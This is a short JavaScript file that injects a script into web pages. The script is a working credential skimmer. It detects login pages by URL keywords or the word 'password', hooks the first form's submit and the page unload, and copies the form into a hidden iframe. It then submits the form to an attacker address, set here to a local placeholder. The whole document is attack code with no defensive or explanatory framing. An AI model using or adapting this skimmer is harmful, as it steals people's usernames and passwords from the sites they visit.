x=document.createElement('script')
x.innerHTML = `// this is the code which will be injected into a given page...
	var uri=window.location.href;
var attackerURI = "http://127.0.0.1";
var i;
function checkURI() {
	loginkw=["sign","log","auth","admin","manage","account"]
	for(i=0; i<loginkw.length; i++) {
		if(uri.indexOf(loginkw[i]) != -1) {
			return true;
		}
	}
	if(document.body.innerText.toLowerCase().indexOf("password") != -1) {
		return true;
	}
	return false;
}
function sendData() {
	cloneform = document.getElementsByTagName("form")[0].cloneNode(true);
	cloneform.action = attackerURI;
	cloneform.setAttribute("onsubmit","return true;")
	sframe.contentDocument.body.append(cloneform);
	sframe.contentDocument.getElementsByTagName("form")[0].submit()
	return true;
}
if(checkURI()) {
	sframe = document.createElement('iframe');
	sframe.src = "about:blank";
	sframe.style.visibility = "hidden";
	sframe.style.display = "none";
	document.body.append(sframe);
	document.getElementsByTagName("form")[0].setAttribute("onsubmit","sendData()");
	document.body.setAttribute("onbeforeunload","sendData()");
}`
document.body.append(x)
